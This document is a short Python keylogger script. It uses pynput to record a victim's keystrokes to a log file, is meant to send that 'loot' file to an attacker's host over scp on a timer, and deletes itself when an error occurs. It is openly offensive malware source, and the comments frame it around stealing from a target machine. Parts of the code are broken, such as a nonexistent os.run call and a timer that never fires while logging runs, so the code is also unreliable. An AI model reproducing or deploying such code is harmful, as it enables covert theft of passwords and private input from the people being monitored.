#!/usr/bin/env python3

from pynput.keyboard import Listener, Key, Controller
import os
from sys import argv
from threading import Timer

# Varibles for checking and making files and directories on the target machine.
user = os.path.expanduser('~')
loggin = os.path.join(user, 'Projects', 'pylogger', 'log.txt')
app_folder = os.path.join(user, 'Projects', 'pylogger')

# Tells the program where to send the loot file
loot_cavern = '' # Ip address you want loot sent to
goblin_loot = '~/loot'

# Keys the keylogger ignores
ignore = [
'Key.shift', 'Key.left', 'Key.up',
'Key.right', 'Key.down', 'Key.cmd',
'Key.backspace'
]

# Sends the loot file to attackers machine using ssh protocol
def loot():
    os.run(f"scp {loggin} goblin@{loot_cavern}:{goblin_loot}")

# Deletes this file
def error_msg():
    os.remove(argv[0])

# Checks the victims box for a directory
true = os.path.isdir(app_folder)

# If its not there this if statement will make the directory
if true == False:
    os.mkdir(app_folder)
elif true == True:
    pass
else:
    error_msg() # Deletes this file if this if statement fails

# Creates loot file then starts logging key strokes
while True:
    try:
        def log_keystroke(key):
            key = str(key).replace("'", "")

            if key in ignore:
                key = ''
            if key == 'Key.space':
                key = ' '
            if key == 'Key.enter' or key == 'Key.tab':
                key = '\n'

            with open(loggin, 'a') as f:
                f.write(key)

        with Listener(on_press=log_keystroke) as l:
            l.join()
        call = Timer(1800.0, loot)
        call.start() # After the given time in seconds it sends the loot file to attacker

    except:
        error_msg() # Deletes this file if anything above goes wrong
